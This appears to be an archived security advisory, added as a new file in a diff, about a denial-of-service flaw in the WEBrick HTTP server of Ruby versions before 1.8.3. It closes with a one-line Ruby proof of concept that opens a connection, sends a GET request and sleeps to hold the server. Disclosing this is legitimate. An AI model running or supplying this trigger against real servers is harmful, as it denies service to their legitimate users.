@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/17645/info
+
+Ruby is affected by a denial-of-service vulnerability in the WEBrick HTTP server. This issue is due to the use of blocking network operations. Ruby's implementation of XML/RPC is also affected, since it uses the vulnerable WEBrick server.
+
+This issue allows remote attackers to cause affected webservers to fail to respond to further legitimate requests.
+
+Ruby versions prior to 1.8.3 are affected by this issue.
+
+The following Ruby command will issue a request sufficient to trigger this issue:
+
+ruby -rsocket -e 'TCPSocket.open("www.example.com", 10080) {|s|
+s.print "GET /z HTTP/1.0\r\n\r\n"
+sleep
+}'
